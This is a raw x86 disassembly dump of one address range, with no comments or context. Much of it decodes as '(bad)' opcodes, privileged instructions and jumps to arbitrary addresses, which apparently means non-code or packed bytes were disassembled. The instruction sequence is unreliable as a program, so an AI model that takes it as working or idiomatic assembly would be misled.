  42922f:	mov    esp,DWORD PTR [ebp+0x18]
  429232:	add    BYTE PTR [eax+0x44],cl
  429235:	xor    eax,DWORD PTR [eax]
  429237:	add    esp,DWORD PTR [esi+0x3b]
  42923a:	inc    ebp
  42923b:	je     0x4291c0
  42923d:	push   ecx
  42923e:	or     cl,BYTE PTR [ebp-0x77]
  429241:	add    eax,esi
  429243:	or     al,0x5e
  429245:	inc    eax
  429246:	add    BYTE PTR [ebx],al
  429248:	data16 and BYTE PTR [ebp+0x50],al
  42924c:	sub    DWORD PTR [ecx],0xffffffe8
  42924f:	add    BYTE PTR [ebp-0x75],ah
  429252:	add    BYTE PTR [eax],bl
  429254:	enter  0x894d,0x8b
  429258:	int3   
  429259:	loopne 0x42928d
  42925b:	rol    BYTE PTR [eax],0x33
  42925e:	lea    cx,[ebp+0xa]
  429262:	data16 jb 0x4292aa
  429265:	add    BYTE PTR [ebx+0x44890855],cl
  42926b:	sbb    ah,al
  42926d:	inc    ebp
  42926e:	lldt   WORD PTR ss:[edx+0x66]
  429273:	xor    ecx,DWORD PTR [eax]
  429275:	sub    edi,esp
  429277:	mov    eax,DWORD PTR [eax]
  429279:	or     al,0x66
  42927b:	ror    edx,cl
  42927d:	dec    ebp
  42927e:	inc    ebp
  42927f:	cmp    eax,DWORD PTR [ebx+0x668b0876]
  429285:	cld    
  429286:	or     BYTE PTR [edi+0x4501dd],dl
  42928c:	(bad)  
  42928d:	into   
  42928e:	out    dx,al
  42928f:	retf   
  429290:	(bad)  
  429291:	dec    ebp
  429292:	mov    al,0x8b
  429294:	jmp    0xea27:0x450ac320
  42929b:	xchg   esi,ebp
  42929d:	add    edi,eax
  42929f:	add    BYTE PTR [eax+0x3f52e955],bh
  4292a5:	push   ebp
  4292a6:	inc    ebp
  4292a7:	xor    ebx,esp
  4292a9:	add    ebp,esi
  4292ab:	push   edx
  4292ac:	push   bp
  4292ae:	inc    ebp
  4292af:	(bad)  
  4292b0:	in     eax,dx
  4292b1:	push   esp
  4292b2:	(bad)  
  4292b3:	inc    edx
  4292b5:	sbb    al,0x33
  4292b7:	ror    BYTE PTR [ebp-0x75fef27c],0x0
  4292be:	add    BYTE PTR [ebp+0x43],0x8b
  4292c2:	jmp    0xf98b:0x100041c8
  4292c9:	xor    esi,DWORD PTR [edx+0x3]
  4292cc:	mov    ecx,DWORD PTR [edi]
  4292ce:	fmul   DWORD PTR [edx]
  4292d0:	add    BYTE PTR [eax],al
  4292d2:	lea    eax,[ebx-0x4700273c]
  4292d8:	add    al,0x4f
  4292da:	pop    DWORD PTR [eax]
  4292dc:	add    DWORD PTR [ecx-0x3faa3c00],ecx
  4292e2:	push   edx
  4292e3:	inc    WORD PTR [ebp+0x8]
  4292e7:	mov    eax,0x514f4d
  4292ec:	(bad)
  4292f0:	add    al,al
  4292f2:	xor    DWORD PTR [ebx-0x74baf730],eax
  4292f8:	test   DWORD PTR [esi+0x74],esp
  4292fb:	inc    ebp
  4292fc:	mov    DWORD PTR [eax+0xa4f08],edi
  429302:	add    BYTE PTR [ecx-0x76c435bb],cl
  429308:	or     dh,cl
  42930a:	or     eax,0x8b8d5045
  42930f:	inc    ebp
  429310:	mov    WORD PTR [ecx+0x3b8a00],?
  429316:	jne    0x42934b
  429318:	mov    edi,DWORD PTR [edx+0x8f3a18]
  42931e:	add    DWORD PTR [ebx],eax
  429320:	add    bh,bh
  429322:	adc    DWORD PTR [eax],ecx
  429324:	adc    DWORD PTR [ebp+0x55],edi
  429327:	push   es
  429328:	mov    ecx,DWORD PTR [ecx-0x38ff8d70]
  42932e:	mov    ebp,DWORD PTR [eax+ebp*1+0x50c211dc]
  429335:	inc    ebp
  429336:	mov    esp,edi
  429338:	or     al,0xdc
  42933a:	push   eax
  42933b:	(bad)  
  42933c:	jne    0x4292f2
  42933e:	call   0x3a8c2f
  429343:	inc    ebp
  429344:	rol    dl,0x84
  429347:	out    dx,al
  429348:	add    bh,al
  42934a:	add    BYTE PTR [ebp+esi*2-0x1c7424],bh
  429351:	(bad)  
  429352:	and    al,al
  429354:	fs in  eax,dx
  429356:	inc    DWORD PTR [ebp-0x7b]
  429359:	js     0x42936a
  42935b:	leave  
  42935c:	scas   al,BYTE PTR es:[edi]
  42935d:	inc    esp
  42935e:	add    BYTE PTR [ebx+ecx*4+0x55f20c10],ch
  429365:	or     BYTE PTR [ebx-0x97717c5],0x83
  42936c:	call   DWORD PTR [edi]
  42936e:	shr    ah,0x84
  429371:	xchg   DWORD PTR [eax],eax
  429373:	add    DWORD PTR [eax],eax
  429375:	add    bh,bh
  429377:	dec    ebp
  429378:	and    BYTE PTR [ecx-0x38],dl
  42937b:	push   eax
  42937c:	dec    DWORD PTR [ebx+0xfd885]
  429382:	mov    BYTE PTR [ebp+0x508bac00],cl
  429388:	mov    WORD PTR [ecx+0x0],ss
  42938b:	lea    ecx,[ebx+0x108b20d8]
  429391:	mov    WORD PTR [edx],ds
  429393:	add    BYTE PTR [edi+0xff01ff],al
  429399:	mov    ecx,DWORD PTR [ebp-0x28]
  42939c:	push   ecx
  42939d:	shl    BYTE PTR [ebp+0x3a],0x8b
  4293a1:	inc    ebp
  4293a2:	in     al,0xeb
  4293a4:	jno    0x429331
  4293a6:	push   edx
  4293a7:	mov    DWORD PTR [eax-0x28],edx
  4293aa:	mov    eax,DWORD PTR [ebp+0x20]
  4293ad:	je     0x429336
  4293af:	mov    eax,DWORD PTR [ecx]
  4293b1:	sbb    BYTE PTR [eax],al
  4293b3:	pop    DWORD PTR [eax]
  4293b5:	add    esi,eax
  4293b7:	add    bl,al
  4293b9:	adc    DWORD PTR [edi],esi
  4293bb:	jmp    0x8bcde40d
  4293c0:	sub    BYTE PTR [ebp+eax*2-0x63c4c800],cl
  4293c7:	jne    0x429354
  4293c9:	mov    ecx,DWORD PTR [eax]
  4293cb:	in     al,0x75
  4293cd:	pop    DWORD PTR [ecx+0x5001]
  4293d3:	push   edx
  4293d4:	inc    DWORD PTR [ebx]
  4293d6:	adc    BYTE PTR [ecx+0x45721cc6],cl
  4293dc:	add    BYTE PTR [edi+0x9],dl
  4293df:	call   DWORD PTR [esi]
  4293e1:	and    dl,al
  4293e3:	and    bh,bh
  4293e5:	inc    edi
  4293e7:	test   eax,edx
  4293e9:	sldt   ebx
  4293ec:	cmp    DWORD PTR [eax],eax
  4293ee:	pushf  
  4293ef:	(bad)  
  4293f0:	jmp    0x4293fe
  4293f2:	mov    eax,edi
  4293f4:	or     al,0x75
  4293f6:	inc    eax
  4293f7:	call   0x428aff
  4293fc:	mov    eax,eax
  4293fe:	loopne 0x429384
  429400:	inc    ebp
  429401:	add    BYTE PTR [ebx+0x1451c00],cl
  429407:	mov    eax,DWORD PTR [ebp+0x20]
  42940a:	add    edi,ecx
  42940c:	add    BYTE PTR [eax],ch
  42940e:	cmp    edi,0x18
  429411:	test   DWORD PTR [ebp+0xf],esi
  429414:	sbb    DWORD PTR [ecx+0x578b0020],0x20
  42941b:	jne    0x42941f
  42941d:	call   0xffa18ee2
  429422:	leave  
  429423:	rcr    BYTE PTR [esp+eax*4],0x55
  429427:	add    ah,ch
  429429:	add    BYTE PTR [edi-0x48fef979],dh
  42942f:	add    BYTE PTR [edx*2+0x75ff3b57],dl
  429436:	inc    esp
  429437:	mov    ebx,DWORD PTR [eax]
  429439:	fcom   st(2)
  42943b:	add    BYTE PTR [edi],bl
  42943d:	lea    ecx,[eax-0x18]
  429440:	(bad)  
  429441:	push   DWORD PTR [ecx]
  429443:	call   0xffb4e1a5
  429448:	mov    edx,DWORD PTR [eax+ecx*1-0x1]
  42944c:	fstp   DWORD PTR [esi+ebx*8]
  42944f:	push   ebp
  429450:	pop    ebp
  429451:	mov    esi,DWORD PTR [edx-0x38]
  429454:	add    DWORD PTR [eax],0x28
  429457:	mov    edi,DWORD PTR [ebx]
  429459:	xor    esi,DWORD PTR [edx+0x3]
  42945c:	xor    esi,DWORD PTR [edi+ebx*2-0x75]
  429460:	pop    ebp
  429461:	or     al,0x4
  429463:	inc    ecx
  429464:	push   ebp
  429465:	(bad)  
  429466:	in     al,dx
  429467:	or     ah,ch
  429469:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42946a:	xbegin 0xffc80a60
  429470:	clc    
  429471:	adc    al,0x45
  429473:	idiv   BYTE PTR [ecx]
  429475:	or     BYTE PTR [eax+eax*1-0x7e278a39],bl
  42947c:	test   DWORD PTR [eax+0x665300f8],ebx
  429482:	add    BYTE PTR [ecx+0x66],dh
  429485:	add    eax,DWORD PTR [ebp+0x52]
  429488:	adc    eax,0x20
  42948b:	xchg   DWORD PTR [ecx+0x4800fc01],ecx
  429491:	test   DWORD PTR [eax],eax
  429493:	clc    
  429494:	data16 or al,BYTE PTR [ebp+0x45]
  429498:	or     DWORD PTR [ebx-0x3d76d7e0],0xfffffff8
  42949f:	rol    BYTE PTR [ebp+0x45],1
  4294a2:	mov    DWORD PTR [ebx+0x4d45e0ec],ecx
  4294a8:	mov    DWORD PTR [ecx+0x1845c7e8],ecx
  4294ae:	push   ebx
  4294af:	add    BYTE PTR [eax+0x0],dl
  4294b2:	push   ecx
  4294b3:	jge    0x4294e8
  4294b5:	add    BYTE PTR [esi+0x4],dl
  4294b8:	jne    0x42951f
  4294ba:	mov    edx,0x457200
  4294bf:	jmp    0x429483
  4294c1:	xor    edi,DWORD PTR [ebx]
  4294c3:	pop    edi
  4294c4:	cvtdq2ps xmm7,xmm0
  4294c7:	ret    0x0
  4294ca:	mov    ecx,DWORD PTR [ebx+0x51750ff0]
  4294d0:	xor    ecx,DWORD PTR [edi]
  4294d2:	add    eax,DWORD PTR [ecx+0x3b]
  4294d5:	push   ebx
  4294d6:	rdpmc  
  4294d8:	out    0x8d,al
  4294da:	add    BYTE PTR [eax],cl
  4294dc:	mov    eax,DWORD PTR [ebp-0x743e8b10]
  4294e2:	ret    0x450c
  4294e5:	sbb    al,0x8b
  4294e7:	cmp    eax,esi
  4294e9:	or     cl,al
  4294eb:	or     al,0xc2
  4294ed:	pop    eax
  4294ee:	inc    ebp
  4294ef:	add    ecx,DWORD PTR [edi]
  4294f1:	add    esi,DWORD PTR [ebp+0x39]
  4294f4:	invd   
  4294f6:	jge    0x429502
  4294f8:	mov    eax,0x478ac0
  4294fd:	cli    
  4294fe:	xor    esp,ecx
  429500:	mov    ebx,0x5b8ac0
  429505:	ret    0x33
  429508:	mov    eax,0x833a8b
  42950d:	sub    BYTE PTR [ebx],al
  42950f:	inc    ebp
  429510:	data16 cmp al,bh
  429513:	pushf  
  429514:	inc    bh
  429516:	mov    esp,esp
  429518:	hlt    
  429519:	test   DWORD PTR [ebp-0x8],esi
  42951c:	mov    eax,DWORD PTR [ebp-0x14]
  42951f:	cmp    cl,BYTE PTR [ebx-0x76478864]
  429525:	dec    edi
  429526:	or     BYTE PTR [eax],al
  429528:	jne    0x4294b3
  42952a:	mov    esi,esp
  42952c:	call   0x77a920f1
  429531:	inc    ebp
  429532:	mov    DWORD PTR [eax+0x984f0c],edi
  429538:	add    BYTE PTR [ecx-0x3ffe0717],cl
  42953e:	add    BYTE PTR [esi+0x7d],ah
  429541:	inc    ebp
  429542:	mov    bx,WORD PTR [ebp+0x8]
  429546:	add    DWORD PTR [ebp+0x50],0x30c008b
  42954d:	inc    ebp
  42954e:	mov    bx,di
  429551:	lock test BYTE PTR [ecx+0x7000801],bh
  429558:	jge    0x42951b
  42955a:	mov    ecx,DWORD PTR [ebx-0x670613f0]
  429560:	cli    
  429561:	xor    bl,bh
  429563:	add    ecx,DWORD PTR [ebx-0x740ff3a9]
  429569:	test   BYTE PTR [eax],cl
  42956b:	add    DWORD PTR [eax+eax*1-0x74ffbb00],eax
  429572:	cmp    ebp,eax
  429574:	xadd   DWORD PTR [ebp+0x66f000c2],ecx
  42957b:	test   BYTE PTR [ebp+0x1],bh
  42957e:	mov    ebx,0x458a00
  429583:	xor    esi,DWORD PTR [ebx]
  429585:	add    esp,DWORD PTR [esi-0x77]
  429588:	pop    ebp
  429589:	loopne 0x4295f1
  42958b:	inc    ebp
  42958c:	clc    
  42958d:	xor    edi,DWORD PTR [ebx]
  42958f:	add    esi,DWORD PTR [edx-0x77]
  429592:	data16 fdivr QWORD PTR [ebp-0x49]
  429596:	mov    ebx,0xb78afc
  42959b:	hlt    
  42959c:	xor    esi,DWORD PTR [esi]
  42959e:	data16 add BYTE PTR [ebp+0x66],bl
  4295a2:	data16 lock clc 
  4295a5:	cmp    eax,DWORD PTR ss:[eax]
  4295a8:	ja     0x429610
  4295aa:	psubq  mm7,QWORD PTR [ebp-0x4]
  4295ae:	ltr    WORD PTR [ebp+0x66]
  4295b2:	add    esi,eax
  4295b4:	add    di,WORD PTR [ebp+0x2b]
  4295b8:	data16 data16 jge 0x429639
  4295bc:	mov    ebx,0xe08a8b
  4295c1:	jge    0x4295f6
  4295c3:	data16 data16 xor al,0x5d
  4295c7:	data16 data16 jne 0x4295c3
  4295cb:	mov    edi,DWORD PTR [ebx]
  4295cd:	fdiv   QWORD PTR [edx+0x7d]
  4295d0:	data16 data16 jge 0x429608
  4295d4:	mov    ebx,0x758a66
  4295d9:	mov    esi,0x667233
  4295de:	pop    ebp
  4295df:	or     BYTE PTR [esi+0x0],ah
  4295e2:	clc    
  4295e3:	mov    edi,DWORD PTR [ebx]
  4295e5:	lock ja 0x429573
  4295e8:	(bad)  
  4295ea:	jge    0x4295e3
  4295ec:	invd   
  4295ee:	pop    ebp
  4295ef:	add    BYTE PTR [ebx],al
  4295f1:	(bad)  
  4295f2:	cmp    di,WORD PTR [ebp+0xf]
  4295f6:	data16 sbb bh,BYTE PTR [ebp+0x0]
  4295fa:	mov    bx,WORD PTR [ebp-0x10]
  4295fe:	pop    bp
  429600:	fbstp  TBYTE PTR [ebx]
  429602:	test   DWORD PTR [ebx],eax
  429604:	add    BYTE PTR [ebx],bh
  429606:	add    BYTE PTR [esi+0x7d],ah
  429609:	jge    0x429596
  42960b:	data16 in al,dx
  42960d:	pop    ebp
  42960e:	stc    
  42960f:	bsf    ecx,DWORD PTR [ebp+0x66320098]
  429616:	mov    edi,ebx
  429618:	in     al,dx
  429619:	test   BYTE PTR [ebp+0x0],bh
  42961c:	mov    eax,DWORD PTR [eax]
  42961e:	call   0xbd3f8fae
  429623:	ss cwde 
  429625:	add    BYTE PTR [edx],dh
  429627:	mov    bx,di
  42962a:	call   0x8b4b13ba
  42962f:	add    ebp,esp
  429631:	mov    bx,di
  429634:	jnp    0x42965c
  429636:	mov    DWORD PTR [ebx+0x367df808],ecx
  42963c:	mov    eax,DWORD PTR [eax]
  42963e:	call   0x7c3e21a9
  429643:	mov    ecx,DWORD PTR [ecx+0x7d030c08]
  429649:	data16 data16 fistp WORD PTR [ebp+0xe]
  42964e:	xor    DWORD PTR [edi-0x48fff7b0],0xfb66f403
  429658:	fisttp WORD PTR [ecx-0x7401f77b]
  42965e:	(bad)  
  42965f:	cld    
  429660:	jne    0x429698
  429662:	xor    eax,DWORD PTR [eax]
  429664:	mov    esp,DWORD PTR [esi-0x10]
  429667:	sti    
  429668:	repnz mov ebp,DWORD PTR [edi-0xffc76f4]
  42966f:	data16 adc bl,bh
  429672:	push   ebp
  429673:	xor    ecx,DWORD PTR es:[ebx+0x36e4f88b]
  42967a:	mov    WORD PTR [eax],es
  42967c:	cwde   
  42967d:	data16 xor bh,bl
  429680:	mov    DWORD PTR [ebx+0x3550ce4],ecx
  429686:	mov    esp,DWORD PTR [esi-0x14]
  429689:	fisttp WORD PTR [ebx-0x3748a9f2]
  42968f:	or     al,0x2b
  429691:	mov    bh,0xba
  429693:	hlt    
  429694:	mov    bh,bl
  429696:	add    BYTE PTR [ecx-0x7446f3cd],cl
  42969c:	dec    edi
  42969d:	or     al,0x0
  42969f:	mov    edi,DWORD PTR [ebx]
  4296a1:	or     BYTE PTR [ebp+0x3b],dh
  4296a4:	mov    ecx,DWORD PTR [edi]
  4296a6:	fdivr  QWORD PTR [ebx-0x7499ff83]
  4296ac:	xor    al,0xd8
  4296ae:	pop    bp
  4296b0:	lock xor esi,DWORD PTR [ebx]
  4296b3:	lea    esp,[esi+0x1f]
  4296b6:	icebp  
  4296b7:	jb     0x4296bd
  4296b9:	add    al,al
  4296bb:	jge    0x4296c9
  4296bd:	mov    eax,eax
  4296bf:	fsubr  st,st(3)
  4296c1:	pop    ebp
  4296c2:	mov    esi,DWORD PTR [ebx]
  4296c4:	in     al,0x8d
  4296c6:	rcr    DWORD PTR [edi],0xc2
  4296c9:	jb     0x429729
  4296cb:	add    cl,cl
  4296cd:	jge    0x4296db
  4296cf:	mov    edx,DWORD PTR [ebp-0x20]
  4296d2:	in     al,dx
  4296d3:	pop    ebp
  4296d4:	data16 data16 or BYTE PTR [esi+edi*4],bh
  4296d9:	data16 cmp bh,BYTE PTR [ebp+0x0]
  4296dd:	mov    ebp,DWORD PTR [ebx]
  4296df:	fdivr  QWORD PTR [esi+0x668a5d]
  4296e5:	cmp    al,0x33
  4296e7:	mov    si,0x4f7d
  4296eb:	mov    eax,DWORD PTR [eax]
  4296ed:	lock inc ebp
  4296ef:	mov    esi,DWORD PTR [edi]
  4296f1:	or     BYTE PTR [edi+esi*8+0x8508ba],bl
  4296f8:	clc    
  4296f9:	(bad)  
  4296fa:	cmp    edi,DWORD PTR [ebx]
  4296fc:	je     0x42970d
  4296fe:	push   ebx
  4296ff:	loopne 0x429710
  429701:	dec    ecx
  429703:	mov    ebp,DWORD PTR [eax-0x1c]
  429706:	int    0xf1
  429708:	mov    esi,0x703084d
  42970d:	orps   xmm6,xmm1
  429710:	add    BYTE PTR [ebp+0x66],dh
  429713:	jmp    0x4296e0
  429715:	mov    eax,DWORD PTR [ebx]
  429717:	lock push ebp
  429719:	ror    DWORD PTR [ebp-0x2972feb3],1
  42971f:	or     bh,dl
  429721:	jb     0x429721
  429723:	add    BYTE PTR [ebx-0x1a7487b3],cl
  429729:	loopne 0x42972b
  42972b:	jne    0x429729
  42972d:	data16 add BYTE PTR [esi+eiz*2],dh
  429731:	mov    ecx,ebx
  429733:	data16 ss icebp 
  429736:	add    BYTE PTR [esi],dh
  429738:	data16 add bl,cl
  42973b:	data16 xor dh,dl
  42973e:	add    BYTE PTR [edx],dh
  429740:	data16 add bl,cl
  429743:	enterw 0x4df1,0x19
  429748:	pop    edi
  429749:	jne    0x4296cc
  42974b:	mov    esi,DWORD PTR [edi]
  42974d:	call   0x77b722ee
  429752:	xor    ebp,DWORD PTR [ebx]
  429754:	lea    esp,[esi+0x48]
  429757:	repnz in eax,0x3b
  42975a:	add    BYTE PTR [ebp-0x37],dh
  42975d:	xor    edx,DWORD PTR [ebp-0x15]
  429760:	in     al,dx
  429761:	xor    edx,DWORD PTR [esi+0x40]
  429764:	mov    DWORD PTR [edi],0x338545fc
  42976a:	clc    
  42976b:	add    edi,DWORD PTR [eax]
  42976d:	pop    edi
  42976e:	pushf  
  42976f:	pop    ebx
  429770:	call   0xff439737
  429775:	mov    edi,eax
  429777:	push   ecx
  429778:	pop    es
  429779:	mov    edi,DWORD PTR [ebx]
  42977b:	push   esi
  42977c:	inc    ebx
  42977d:	cld    
  42977e:	js     0x429780
  429780:	popa   
  429781:	data16 (bad) 
  429783:	into   
  429784:	push   0xb900cd36
  429789:	data16 or dh,cl
  42978c:	pop    es
  42978d:	xor    ah,BYTE PTR [esi+0x0]
  429790:	add    bh,al
  429792:	cld    
  429793:	cld    
  429794:	add    BYTE PTR [ebp+0x38c3f866],al
  42979a:	ss pushf 
  42979c:	add    BYTE PTR [esi+0x66],ah
  42979f:	into   
  4297a0:	ret    
  4297a1:	pop    ebp
  4297a2:	add    al,0x57
  4297a4:	add    BYTE PTR [edi-0x723c409a],dh
  4297aa:	add    edi,edi
  4297ac:	jne    0x4297fe
  4297ae:	lea    edx,[ecx+0x1]
  4297b1:	mov    ebx,0xd64ff1
  4297b6:	sar    DWORD PTR [ebx],1
  4297b8:	test   BYTE PTR [ebp+0x30],dh
  4297bb:	mov    DWORD PTR [esp+edi*8-0x76],esp
  4297bf:	push   edi
  4297c0:	xor    BYTE PTR [ebx],0x3b
  4297c3:	mov    esi,ebx
  4297c5:	xor    eax,DWORD PTR [eax-0x3c73879a]
  4297cb:	xor    BYTE PTR [ebp+0x64],al
  4297ce:	pop    ebx
  4297cf:	mov    ebx,0x9c3a37
  4297d4:	je     0x429801
  4297d6:	xor    edi,DWORD PTR [ebx+0x668a33]
  4297dc:	mov    WORD PTR [ebx],?
  4297de:	xor    BYTE PTR [ebx+0x8b4f64],bh
  4297e4:	pop    edi
  4297e5:	cmp    ecx,ecx
  4297e7:	jne    0x42983e
  4297e9:	mov    ebp,esp
  4297eb:	cld    
  4297ec:	push   esi
  4297ed:	pop    ebx
  4297ee:	inc    ebp
  4297ef:	stc    
  4297f0:	aaa    
  4297f1:	test   DWORD PTR [eax+edi*8-0x317af642],ebx
  4297f8:	clc    
  4297f9:	test   dl,dl
  4297fb:	xor    bh,bh
  4297fd:	fs pop si
  429800:	or     bl,al
  429802:	cld    
  429803:	mov    eax,DWORD PTR [eax]
  429805:	push   ecx
  429806:	push   di
  429808:	retf   0x3645
  42980b:	aaa    
  42980c:	add    BYTE PTR [esi+eiz*2+0x3285cabe],bl
  429813:	clc    
  429814:	add    BYTE PTR [ebx+0x66],bl
  429817:	dec    edx
  429819:	mov    edx,DWORD PTR [edi-0x76]
  42981c:	push   edi
  42981d:	add    al,0xb7
  42981f:	xor    al,0xba
  429821:	cmp    al,0x8d
  429823:	je     0x429824
  429825:	mov    edx,DWORD PTR [eax-0x46]
  429828:	push   ecx
  429829:	lea    edi,[ebx+0x504fff]
  42982f:	push   ecx
  429830:	cmp    edx,DWORD PTR [ebx+0x75]
  429833:	mov    ecx,DWORD PTR [ecx+0x723afcbb]
  429839:	add    BYTE PTR [ebx],dh
  42983b:	sub    ecx,DWORD PTR [ebx+0x668a33bb]
  429841:	add    BYTE PTR [ebx+esi*1+0x4f64bb30],cl
  429848:	mov    ebx,0x3b3a00
  42984d:	jne    0x42987a
  42984f:	mov    DWORD PTR [ebx+0x728afc],edi
  429855:	xor    esi,DWORD PTR [ebx]
  429857:	mov    edi,DWORD PTR [ebx+0x8d4f33]
  42985d:	push   edi
  42985e:	cmp    esp,ebp
  429860:	jne    0x429862
  429862:	sbb    DWORD PTR [eax],0x8085c3fc
  429868:	clc    
  429869:	inc    ebx
  42986a:	pop    ebx
  42986b:	sti    
  42986c:	add    eax,0xeb8bc075
  429871:	cld    
  429872:	xor    edi,DWORD PTR ds:0xf8c3855e
  429878:	mov    ecx,DWORD PTR [ecx+edx*2]
  42987b:	rol    DWORD PTR [ebp-0x37],0xf
  42987f:	mov    DWORD PTR [eax],ecx
  429881:	inc    edi
  429882:	(bad)  
  429883:	in     eax,0x4
  429885:	add    bh,bh
  429887:	(bad)  
  429888:	mov    esi,0xc38a5e
  42988d:	mov    esi,DWORD PTR [ebx]
  42988f:	push   ecx
  429890:	mov    edi,0xfc4fc7
  429895:	test   DWORD PTR [ebp-0x8],edx
  429898:	data16 cmp bh,al
  42989b:	pushf  
  42989c:	sub    ebp,eax
  42989e:	inc    ebp
  42989f:	(bad)  
  4298a0:	sub    edi,edi
  4298a2:	mov    DWORD PTR [ebx+0x3a03ba08],ecx
  4298a8:	inc    ebp
  4298a9:	add    BYTE PTR [esi+0x2b],ah
  4298ac:	or     bh,BYTE PTR [edx+0xf8ac2]
  4298b2:	cmp    al,0x33
  4298b4:	mov    edi,DWORD PTR [edx+0x44f81]
  4298ba:	(bad)  
  4298bb:	cmp    esi,DWORD PTR [ebx]
  4298bd:	je     0x429877
  4298bf:	push   ebx
  4298c0:	dec    edi
  4298c1:	str    ecx
  4298c4:	cmp    ebp,DWORD PTR [eax+0x75]
  4298c7:	int    0x33
  4298c9:	mov    edi,0x789085f
  4298ce:	mov    eax,DWORD PTR [esp+edi*8]
  4298d1:	add    cl,cl
  4298d3:	data16 add al,0xcb
  4298d6:	push   ebp
  4298d7:	add    ebp,esp
  4298d9:	jne    0x4298c7
  4298db:	(bad)  
  4298dc:	mov    DWORD PTR [ecx],0xd685f7ec
  4298e2:	clc    
  4298e3:	xlat   BYTE PTR ds:[ebx]
  4298e4:	inc    ebp
  4298e5:	mov    edi,DWORD PTR [ecx]
  4298e7:	push   eax
  4298e8:	pushf  
  4298e9:	in     eax,0x8b
  4298eb:	add    ah,ch
  4298ed:	cld    
  4298ee:	push   eax
  4298ef:	add    BYTE PTR [ecx+0x66],dl
  4298f2:	add    eax,0x3672cb
  4298f7:	add    BYTE PTR [ebp+0x66],al
  4298fa:	(bad)  
  4298fb:	retf   
  4298fc:	lock xor al,BYTE PTR [ebp+0x4566f800]
  429903:	retf   
  429904:	cmp    al,0xc8
  429906:	pushf  
  429907:	jge    0x4298d0
  429909:	aaa    
  42990a:	cld    
  42990b:	pushf  
  42990c:	test   DWORD PTR [edi-0x8],ebx
  42990f:	je     0x429956
  429911:	xor    esi,DWORD PTR ds:0x7020840
  429917:	ror    BYTE PTR [ebp-0x37],0x8d
  42991b:	push   ebp
  42991c:	add    esp,ebp
  42991e:	jb     0x4298ab
  429920:	add    BYTE PTR [eax],cl
  429922:	dec    ebp
  429923:	mov    bh,0x81
  429925:	push   esi
  429926:	push   eax
  429927:	adc    DWORD PTR [ecx-0x3b],0x3698ff81
  42992e:	xor    al,BYTE PTR [eax]
  429930:	mov    edx,DWORD PTR [edi+0x10]
  429933:	(bad)  
  429934:	scas   eax,DWORD PTR es:[edi]
  429935:	xor    bh,BYTE PTR [ebx]
  429937:	add    BYTE PTR [edi],cl
  429939:	mov    ebp,ebp
  42993b:	cld    
  42993c:	add    BYTE PTR [ebx],bh
  42993e:	mov    esi,DWORD PTR [eax+edx*1-0x75]
  429942:	dec    ebp
  429943:	or     BYTE PTR [ebx],ch
  429945:	ret    0x458b
  429948:	lock jmp 0x42993c
  42994b:	mov    ecx,DWORD PTR [eax]
  42994d:	or     BYTE PTR [edi],al
  42994f:	mov    ecx,eax
  429951:	xor    DWORD PTR [edx+0x2],0x0
  429955:	mov    bh,0xc1
  429957:	adc    BYTE PTR [eax],dh
  429959:	iret   
  42995a:	inc    ebp
  42995b:	mov    DWORD PTR [ebx],0x4dfff8c5
  429961:	inc    BYTE PTR [ebx]
  429963:	xor    bh,al
  429965:	add    BYTE PTR [ecx],dl
  429967:	data16 adc al,bh
  42996a:	dec    ecx
  42996b:	fisttp WORD PTR [ecx+0x456604c0]
  429971:	add    dh,BYTE PTR ds:0x75e0845
  429977:	ret    0x4d
  42997a:	lea    ecx,[ebx+0x18728301]
  429980:	add    BYTE PTR [ebp+0x45],al
  429983:	cmp    cl,ch
  429985:	pushf  
  429986:	add    bh,al
  429988:	add    al,ch
  42998a:	inc    ebp
  42998b:	test   DWORD PTR [ebx-0x3eba0708],ecx
  429991:	xor    eax,0x781084d
  429996:	push   eax
  429997:	cwde   
  429998:	push   ecx
  429999:	xor    al,BYTE PTR [ecx+0x32f89889]
  42999f:	inc    ebp
  4299a0:	cmp    esp,DWORD PTR [eax]
  4299a2:	jbe    0x429940
  4299a4:	mov    eax,edi
  4299a6:	or     ah,dh
  4299a8:	inc    ebp
  4299a9:	test   DWORD PTR [ebx+0x4d450cf8],ecx
  4299af:	cmp    cl,BYTE PTR [ebx-0x74747664]
  4299b5:	in     al,dx
  4299b6:	hlt    
  4299b7:	push   eax
  4299b8:	push   eax
  4299b9:	push   ecx
  4299ba:	push   ecx
  4299bb:	mov    ecx,DWORD PTR [ebx-0x7b7b0708]
  4299c1:	cwde   
  4299c2:	cwde   
  4299c3:	xor    dh,BYTE PTR [edx]
  4299c5:	mov    ecx,DWORD PTR [ecx+0x5bf1f8e8]
  4299cb:	or     BYTE PTR [ebp+0x7],al
  4299ce:	mov    eax,ecx
  4299d0:	clc    
  4299d1:	jb     0x429994
  4299d3:	add    BYTE PTR [ebp+0x55],cl
  4299d6:	or     DWORD PTR [edi],0xc251d150
  4299dc:	add    DWORD PTR [ebx+0x320098],0x8b76453b
  4299e6:	mov    edi,eax
  4299e8:	or     cl,al
  4299ea:	inc    ebp
  4299eb:	dec    ebp
  4299ec:	mov    eax,DWORD PTR [ecx+0x514d500c]
  4299f2:	or     WORD PTR [ecx],0x8998
  4299f7:	xor    cl,BYTE PTR [ebx+0x5076fc3b]
  4299fd:	mov    edx,DWORD PTR [ecx+0x8]
  429a00:	mov    eax,DWORD PTR [ebp-0x8]
  429a03:	mov    eax,DWORD PTR [esp+ecx*1-0x74cdb268]
  429a0a:	mov    DWORD PTR [ecx+0x4178bf8],ecx
  429a10:	inc    ebp
  429a11:	dec    eax
  429a12:	add    ecx,DWORD PTR [ebx+0x504df0f8]
  429a18:	add    edx,DWORD PTR [ecx-0x8]
  429a1b:	mov    ecx,DWORD PTR [ecx]
  429a1d:	clc    
  429a1e:	or     BYTE PTR [ebp+eax*2+0x45324098],al
  429a25:	mov    ecx,ebp
  429a27:	clc    
  429a28:	(bad)  
  429a29:	popf   
  429a2a:	inc    DWORD PTR [eax]
  429a2c:	ret    0x8b
  429a2f:	adc    BYTE PTR [ebx-0x38d4aeb3],cl
  429a35:	mov    edi,esp
  429a37:	hlt    
  429a38:	test   ecx,esi
  429a3a:	clc    
  429a3b:	or     BYTE PTR [ebp+0x7],al
  429a3e:	cmp    ecx,eax
  429a40:	pushf  
  429a41:	jb     0x429a76
  429a43:	add    BYTE PTR [eax-0x3f],al
  429a46:	inc    eax
  429a47:	daa    
  429a48:	inc    ebp
  429a49:	inc    ebp
  429a4a:	xor    eax,0x7f80803
  429a4f:	dec    ebp
  429a50:	cwde   
  429a51:	add    esi,DWORD PTR [edx]
  429a53:	clc    
